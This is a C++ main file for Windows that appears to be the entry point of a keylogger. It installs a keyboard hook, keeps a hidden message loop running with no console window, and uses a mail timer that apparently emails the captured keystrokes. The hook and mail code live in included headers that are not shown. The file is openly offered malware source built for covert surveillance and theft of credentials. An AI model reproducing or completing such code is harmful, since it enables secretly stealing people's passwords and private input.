#include <iostream>
#include <windows.h>
#include "helper.h"
//#include "base64.h"
#include "KeyConstants.h"
#include "IO.h"
#include "timer.h"
#include "SendMail.h"
#include "KeybHook.h"


using namespace std;

int main ()
{
        MSG Msg;
        IO::MKDir(IO::GetOurPath(true));
        InstallHook();
        //this is so there is no cmd window that pops up
        while(GetMessage(&Msg,NULL,0,0))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }
        MailTimer.Stop();
        return 0;
}
